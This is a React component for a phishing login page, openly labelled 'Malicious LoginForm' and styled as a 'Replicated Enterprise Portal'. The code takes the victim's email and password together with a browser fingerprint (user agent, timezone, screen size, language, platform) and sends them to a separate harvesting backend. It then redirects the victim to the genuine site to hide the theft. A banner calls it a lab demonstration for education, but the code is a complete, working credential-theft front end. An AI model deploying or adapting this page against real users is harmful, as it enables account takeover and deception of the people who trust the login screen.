import { useState } from 'react';
import './LoginForm.css';
import { config } from '../config';

/**
 * Malicious LoginForm Component
 * 
 * Purpose: Capture credentials and device fingerprint, then redirect to legitimate site
 * 
 * Key behaviors:
 * - Collects email + password (NO validation)
 * - Captures device fingerprint (UserAgent, timezone, screen resolution, language, platform)
 * - Sends to malicious backend (port 5000)
 * - On success: Immediately redirects to legitimate site with email parameter
 * - NO error handling, NO success pages, NO dashboard
 */

const LoginForm = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  /**
   * Collect device fingerprint data
   */
  const getDeviceFingerprint = () => {
    return {
      userAgent: navigator.userAgent,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenResolution: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      platform: navigator.platform,
    };
  };

  /**
   * Handle form submission
   * - Send credentials + fingerprint to malicious backend
   * - Redirect to legitimate site immediately
   */
  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const fingerprint = getDeviceFingerprint();
      
      // Send to malicious backend
      const response = await fetch(
        `http://${config.VITE_BACKEND_HOST}:${config.VITE_BACKEND_PORT}/api/auth/login`,
        {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email,
            password,
            ...fingerprint,
          }),
        }
      );

      // Backend always returns 200 OK - no need to check status
      // Immediately redirect to legitimate site
      if (config.VITE_LEGITIMATE_SERVER_IP) {
        window.location.href = `http://${config.VITE_LEGITIMATE_SERVER_IP}/`;
      }
    } catch (error) {
      console.error('Error:', error);
      // Even on error, redirect to legitimate site
      if (config.VITE_LEGITIMATE_SERVER_IP) {
        window.location.href = `http://${config.VITE_LEGITIMATE_SERVER_IP}/`;
      }
    }
  };

  return (
    <div className="login-wrapper">
      <div className="login-container">
        <div className="login-card">
          <div className="logo-section">
            <h1 className="logo-text">Replicated Enterprise Portal</h1>
            <p className="tagline">Secure Access Hub</p>
          </div>

          <form className="login-form" onSubmit={handleSubmit}>
            <div className="form-group">
              <label htmlFor="email">Email Address</label>
              <input
                type="email"
                id="email"
                className="form-input"
                placeholder="Enter your email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
                disabled={isLoading}
              />
            </div>

            <div className="form-group">
              <label htmlFor="password">Password</label>
              <input
                type="password"
                id="password"
                className="form-input"
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                disabled={isLoading}
              />
            </div>

            <button
              type="submit"
              className="login-button"
              disabled={isLoading}
            >
              {isLoading ? (
                <>
                  <span className="spinner"></span>
                  Authenticating...
                </>
              ) : (
                'Sign In'
              )}
            </button>
          </form>

          <div className="security-info">
            <p>🔒 Secure enterprise authentication</p>
          </div>
        </div>

        <div className="disclaimer-banner">
          <strong>⚠️ Lab Environment</strong>
          <p>This is a controlled security demonstration for educational purposes only.</p>
        </div>
      </div>
    </div>
  );
};

export default LoginForm;
